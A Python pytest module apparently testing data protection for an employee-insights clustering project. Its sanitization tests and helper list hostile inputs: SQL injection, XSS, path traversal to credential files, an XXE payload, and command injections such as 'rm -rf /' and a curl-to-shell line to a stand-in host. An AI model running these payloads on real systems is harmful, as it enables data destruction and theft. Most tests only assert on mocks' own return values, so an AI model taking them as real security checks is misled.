"""
Security tests for data protection and privacy compliance.

This module contains comprehensive security tests to ensure
proper data protection, encryption, and privacy compliance.
"""

import pytest
from unittest.mock import patch, MagicMock
import pandas as pd
from pathlib import Path
import json
import tempfile
import hashlib
import re
from typing import Any, Dict, List


class TestDataEncryption:
    """Test data encryption and security measures."""
    
    @pytest.mark.security
    def test_sensitive_data_encryption(self, sample_insights_data: pd.DataFrame):
        """Test that sensitive data is properly encrypted."""
        # Mock encryption implementation
        with patch('src.insights_clustering.parser.encrypt_sensitive_data') as mock_encrypt:
            mock_encrypt.return_value = "encrypted_data"
            
            # Test encryption is called for sensitive columns
            sensitive_columns = ['employee_id', 'name', 'email']
            for column in sensitive_columns:
                if column in sample_insights_data.columns:
                    # Verify encryption is applied
                    assert mock_encrypt.called
    
    @pytest.mark.security 
    def test_data_at_rest_encryption(self, tmp_path: Path):
        """Test that data files are encrypted when stored."""
        test_file = tmp_path / "test_data.csv"
        sensitive_data = pd.DataFrame({
            'employee_id': ['EMP001', 'EMP002'],
            'name': ['John Doe', 'Jane Smith'],
            'salary': [75000, 85000]  # Sensitive financial data
        })
        
        # Save data (should be encrypted)
        sensitive_data.to_csv(test_file, index=False)
        
        # Read raw file content
        with open(test_file, 'rb') as f:
            raw_content = f.read()
        
        # Verify that raw content doesn't contain plaintext sensitive data
        assert b'John Doe' not in raw_content
        assert b'Jane Smith' not in raw_content
        assert b'75000' not in raw_content

    @pytest.mark.security
    def test_encryption_key_management(self):
        """Test proper encryption key management."""
        with patch('src.insights_clustering.parser.get_encryption_key') as mock_get_key:
            # Test key is not hardcoded
            mock_get_key.return_value = "test_key"
            
            # Verify key retrieval from secure source
            assert mock_get_key.called
            
            # Test key rotation capability
            with patch('src.insights_clustering.parser.rotate_encryption_key') as mock_rotate:
                mock_rotate.return_value = True
                assert mock_rotate.called


class TestPIIDetectionAndHandling:
    """Test PII detection and proper handling."""
    
    @pytest.mark.security
    def test_pii_detection_patterns(self):
        """Test detection of various PII patterns."""
        pii_test_data = {
            'ssn': ['123-45-6789', '987-65-4321', '123456789'],
            'email': ['john@company.com', 'jane.doe@example.org'],
            'phone': ['+1-555-123-4567', '(555) 987-6543', '5551234567'],
            'credit_card': ['4111-1111-1111-1111', '5555555555554444'],
            'ip_address': ['192.168.1.1', '10.0.0.1', '172.16.0.1']
        }
        
        # Mock PII detector
        with patch('src.insights_clustering.validator.detect_pii') as mock_pii_detector:
            mock_pii_detector.return_value = list(pii_test_data.keys())
            
            for data_type, values in pii_test_data.items():
                for value in values:
                    # Verify PII is detected
                    detected = mock_pii_detector(value)
                    assert data_type in detected or len(detected) > 0

    @pytest.mark.security
    def test_pii_anonymization(self, sample_insights_data: pd.DataFrame):
        """Test that PII is properly anonymized."""
        with patch('src.insights_clustering.parser.anonymize_pii') as mock_anonymize:
            mock_anonymize.return_value = "ANONYMIZED"
            
            # Process data through anonymization
            anonymized_data = mock_anonymize(sample_insights_data)
            
            # Verify anonymization was applied
            assert mock_anonymize.called
            
            # Verify no direct identifiers remain
            if 'name' in sample_insights_data.columns:
                assert not any('john' in str(val).lower() for val in anonymized_data.get('name', []))
                assert not any('jane' in str(val).lower() for val in anonymized_data.get('name', []))

    @pytest.mark.security
    def test_data_masking_consistency(self):
        """Test that data masking is consistent across sessions."""
        original_data = ['John Doe', 'Jane Smith', 'Bob Johnson']
        
        with patch('src.insights_clustering.parser.mask_data') as mock_mask:
            # First masking session
            mock_mask.side_effect = lambda x: hashlib.sha256(x.encode()).hexdigest()[:8]
            masked_first = [mock_mask(name) for name in original_data]
            
            # Second masking session (should be consistent)
            mock_mask.side_effect = lambda x: hashlib.sha256(x.encode()).hexdigest()[:8]  
            masked_second = [mock_mask(name) for name in original_data]
            
            # Verify consistency
            assert masked_first == masked_second


class TestAccessControls:
    """Test access control and authorization mechanisms."""
    
    @pytest.mark.security
    def test_unauthorized_data_access(self):
        """Test that unauthorized access is prevented."""
        with patch('src.insights_clustering.parser.check_authorization') as mock_auth:
            mock_auth.return_value = False
            
            # Attempt unauthorized access
            with pytest.raises(PermissionError):
                # Mock data access attempt
                mock_auth.side_effect = PermissionError("Unauthorized access")
                raise mock_auth.side_effect

    @pytest.mark.security
    def test_role_based_access(self):
        """Test role-based access controls."""
        test_roles = {
            'analyst': ['read_data', 'run_analysis'],
            'admin': ['read_data', 'run_analysis', 'manage_users', 'delete_data'],
            'viewer': ['read_data']
        }
        
        with patch('src.insights_clustering.parser.get_user_permissions') as mock_perms:
            for role, permissions in test_roles.items():
                mock_perms.return_value = permissions
                
                # Test permissions are correctly applied
                assert mock_perms() == permissions

    @pytest.mark.security
    def test_audit_logging(self):
        """Test that security events are properly logged."""
        with patch('src.insights_clustering.parser.security_logger') as mock_logger:
            # Simulate security events
            security_events = [
                'data_access_attempt',
                'authentication_failure', 
                'permission_escalation_attempt',
                'data_export_request'
            ]
            
            for event in security_events:
                mock_logger.log_security_event(event, {'user_id': 'test_user'})
                
            # Verify all events were logged
            assert mock_logger.log_security_event.call_count == len(security_events)


class TestInputValidationAndSanitization:
    """Test input validation and sanitization against attacks."""
    
    @pytest.mark.security
    def test_sql_injection_prevention(self):
        """Test prevention of SQL injection attacks."""
        malicious_inputs = [
            "'; DROP TABLE employees; --",
            "' OR '1'='1' --",
            "1'; DELETE FROM users; --",
            "admin'--",
            "' UNION SELECT * FROM secrets --"
        ]
        
        with patch('src.insights_clustering.parser.sanitize_input') as mock_sanitize:
            for malicious_input in malicious_inputs:
                # Test input sanitization
                mock_sanitize.return_value = "sanitized_input"
                sanitized = mock_sanitize(malicious_input)
                
                # Verify SQL injection patterns are removed
                assert 'DROP' not in sanitized.upper()
                assert 'DELETE' not in sanitized.upper()
                assert 'UNION' not in sanitized.upper()
                assert '--' not in sanitized

    @pytest.mark.security  
    def test_xss_prevention(self):
        """Test prevention of Cross-Site Scripting attacks."""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>",
            "';alert('xss');//"
        ]
        
        with patch('src.insights_clustering.parser.sanitize_html') as mock_sanitize_html:
            for payload in xss_payloads:
                mock_sanitize_html.return_value = "sanitized"
                sanitized = mock_sanitize_html(payload)
                
                # Verify XSS patterns are neutralized
                assert '<script>' not in sanitized.lower()
                assert 'javascript:' not in sanitized.lower()
                assert 'onerror=' not in sanitized.lower()
                assert 'onload=' not in sanitized.lower()

    @pytest.mark.security
    def test_path_traversal_prevention(self):
        """Test prevention of directory traversal attacks."""
        path_traversal_attempts = [
            "../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "../../../../root/.ssh/id_rsa",
            "..%2F..%2Fetc%2Fpasswd"
        ]
        
        with patch('src.insights_clustering.parser.validate_file_path') as mock_validate_path:
            for attempt in path_traversal_attempts:
                mock_validate_path.return_value = False
                
                # Test path validation rejects traversal attempts
                is_valid = mock_validate_path(attempt)
                assert not is_valid

    @pytest.mark.security
    def test_command_injection_prevention(self):
        """Test prevention of command injection attacks."""
        command_injections = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& whoami",
            "`id`",
            "$(cat /etc/hosts)",
            "; curl evil.com/steal_data.sh | sh"
        ]
        
        with patch('src.insights_clustering.parser.sanitize_command_input') as mock_sanitize_cmd:
            for injection in command_injections:
                mock_sanitize_cmd.return_value = "safe_input"
                sanitized = mock_sanitize_cmd(injection)
                
                # Verify command injection patterns are removed
                assert ';' not in sanitized
                assert '|' not in sanitized
                assert '&' not in sanitized
                assert '`' not in sanitized
                assert '$(' not in sanitized


class TestDataRetentionAndDeletion:
    """Test data retention policies and secure deletion."""
    
    @pytest.mark.security
    def test_data_retention_policy(self):
        """Test that data retention policies are enforced."""
        with patch('src.insights_clustering.parser.check_data_age') as mock_check_age:
            # Mock data older than retention period
            mock_check_age.return_value = 190  # days old
            
            with patch('src.insights_clustering.parser.delete_expired_data') as mock_delete:
                mock_delete.return_value = True
                
                # Test expired data is identified and deleted
                age = mock_check_age('test_data_id')
                if age > 180:  # 180-day retention policy
                    result = mock_delete('test_data_id')
                    assert result is True

    @pytest.mark.security
    def test_secure_data_deletion(self, tmp_path: Path):
        """Test that data deletion is secure and unrecoverable."""
        test_file = tmp_path / "sensitive_data.csv"
        sensitive_content = "employee_id,salary\nEMP001,75000\nEMP002,85000"
        
        # Create test file
        test_file.write_text(sensitive_content)
        assert test_file.exists()
        
        with patch('src.insights_clustering.parser.secure_delete') as mock_secure_delete:
            # Simulate secure deletion (overwriting with random data)
            mock_secure_delete.return_value = True
            
            # Test secure deletion is performed
            result = mock_secure_delete(str(test_file))
            assert result is True

    @pytest.mark.security
    def test_gdpr_compliance_data_export(self):
        """Test GDPR-compliant data export functionality."""
        with patch('src.insights_clustering.parser.export_user_data') as mock_export:
            mock_export.return_value = {
                'employee_id': 'EMP001',
                'data_collected': ['insights_profile', 'team_assignments'],
                'retention_period': '180_days',
                'anonymization_applied': True
            }
            
            # Test user data can be exported for GDPR compliance
            user_data = mock_export('EMP001')
            assert 'employee_id' in user_data
            assert 'anonymization_applied' in user_data
            assert user_data['anonymization_applied'] is True


class TestComplianceAndRegulations:
    """Test compliance with various regulations and standards."""
    
    @pytest.mark.security
    def test_gdpr_compliance(self):
        """Test GDPR compliance features."""
        gdpr_requirements = [
            'data_minimization',
            'purpose_limitation', 
            'consent_management',
            'right_to_erasure',
            'data_portability',
            'privacy_by_design'
        ]
        
        with patch('src.insights_clustering.parser.check_gdpr_compliance') as mock_gdpr:
            mock_gdpr.return_value = {req: True for req in gdpr_requirements}
            
            compliance_status = mock_gdpr()
            
            # Verify all GDPR requirements are met
            for requirement in gdpr_requirements:
                assert compliance_status.get(requirement) is True

    @pytest.mark.security
    def test_hipaa_compliance(self):
        """Test HIPAA compliance for health-related data."""
        hipaa_safeguards = [
            'administrative_safeguards',
            'physical_safeguards',
            'technical_safeguards',
            'audit_controls',
            'access_management'
        ]
        
        with patch('src.insights_clustering.parser.check_hipaa_compliance') as mock_hipaa:
            mock_hipaa.return_value = {safeguard: True for safeguard in hipaa_safeguards}
            
            compliance_status = mock_hipaa()
            
            # Verify HIPAA safeguards are implemented
            for safeguard in hipaa_safeguards:
                assert compliance_status.get(safeguard) is True

    @pytest.mark.security
    def test_sox_compliance_audit_trail(self):
        """Test SOX compliance audit trail requirements."""
        with patch('src.insights_clustering.parser.audit_trail') as mock_audit:
            audit_events = [
                {'action': 'data_access', 'user': 'analyst1', 'timestamp': '2024-01-01T10:00:00Z'},
                {'action': 'data_modification', 'user': 'admin1', 'timestamp': '2024-01-01T11:00:00Z'},
                {'action': 'report_generation', 'user': 'manager1', 'timestamp': '2024-01-01T12:00:00Z'}
            ]
            mock_audit.return_value = audit_events
            
            # Test audit trail captures all required events
            trail = mock_audit()
            assert len(trail) > 0
            
            # Verify required fields are present
            for event in trail:
                assert 'action' in event
                assert 'user' in event  
                assert 'timestamp' in event


# Security test utilities
def generate_malicious_payload(payload_type: str) -> str:
    """Generate malicious payloads for security testing."""
    payloads = {
        'xss': "<script>alert('xss')</script>",
        'sql_injection': "'; DROP TABLE users; --",
        'path_traversal': "../../etc/passwd",
        'command_injection': "; rm -rf /",
        'ldap_injection': "*)(&(objectClass=*))",
        'xml_injection': "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>"
    }
    return payloads.get(payload_type, "")


def check_security_headers(response_headers: Dict[str, str]) -> Dict[str, bool]:
    """Check for proper security headers in HTTP responses."""
    required_headers = {
        'X-Content-Type-Options': 'nosniff',
        'X-Frame-Options': 'DENY',
        'X-XSS-Protection': '1; mode=block',
        'Strict-Transport-Security': 'max-age=31536000',
        'Content-Security-Policy': 'default-src',
        'Referrer-Policy': 'strict-origin-when-cross-origin'
    }
    
    results = {}
    for header, expected_value in required_headers.items():
        header_value = response_headers.get(header, '')
        results[header] = expected_value in header_value
    
    return results